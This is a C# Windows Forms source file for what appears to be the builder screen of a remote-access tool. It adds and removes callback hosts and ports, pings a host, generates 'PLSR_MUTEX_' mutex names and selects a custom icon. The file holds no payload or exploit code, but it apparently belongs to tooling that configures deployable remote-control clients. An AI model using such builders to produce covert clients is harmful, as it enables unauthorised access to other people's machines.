using server.Others;
using System;
using System.Drawing;
using System.Net.NetworkInformation;
using System.Windows.Forms;
namespace server.Forms
{
    public partial class frm_builderr : Form
    {
        public frm_builderr()
        {
            InitializeComponent();
        }
        #region Declaration

        #endregion
        private void flatButton2_Click(object sender, EventArgs e)
        {

        }

        #region Methods
        public void AddHost(string dns, int port)
        {
            Dnslist.Items.Add(dns).SubItems.Add(port.ToString());
        }
        public void RemoveHost(ListViewItem dns)
        {
            Dnslist.Items.Remove(dns);
        }
        public void PingHost(string Host)
        {
            try
            {
                Ping myPing = new Ping();
                PingReply reply = myPing.Send(Host, 1000);
                if (reply != null)
                {
                    flatAlertBox1.Text = "The Host is Alive";
                    flatAlertBox1.kind = FlatUI.FlatAlertBox._Kind.Success;
                    flatAlertBox1.Visible = true;

                }

            }
            catch
            {
                flatAlertBox1.Text = "The Host is Dead :(";
                flatAlertBox1.kind = FlatUI.FlatAlertBox._Kind.Error;
                flatAlertBox1.Visible = true;

            }
        }
        public string GenerateMutex()
        {
            return "PLSR_MUTEX_" + Helper.GetRandomString(18);
        }
        #endregion

        private void flatButton3_Click(object sender, EventArgs e)
        {
            AddHost(flatTextBox1.Text, (int)flatNumeric1.Value);
        }

        private void flatButton4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in Dnslist.SelectedItems)
            {
                RemoveHost(item);
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            PingHost(flatTextBox1.Text);
        }

        private void flatButton5_Click(object sender, EventArgs e)
        {
            txt_Mutex.Text = GenerateMutex();
        }

        private void flatCheckBox1_CheckedChanged(object sender)
        {
            panel1.Enabled = flatCheckBox1.Checked;
        }

        private void flatCheckBox2_CheckedChanged(object sender)
        {
            panel2.Enabled = flatCheckBox2.Checked;
        }

        private void flatCheckBox6_CheckedChanged(object sender)
        {
            panel3.Enabled = flatCheckBox6.Checked;
        }

        private void flatCheckBox7_CheckedChanged(object sender)
        {
            panel5.Enabled = flatCheckBox7.Checked;
        }

        private void flatButton6_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {

                    txt_iconpath.Text = ofd.FileName;
                    Bitmap.FromHicon(new Icon(ofd.FileName, new Size(64, 64)).Handle);

                }
            }
        }


    }
}
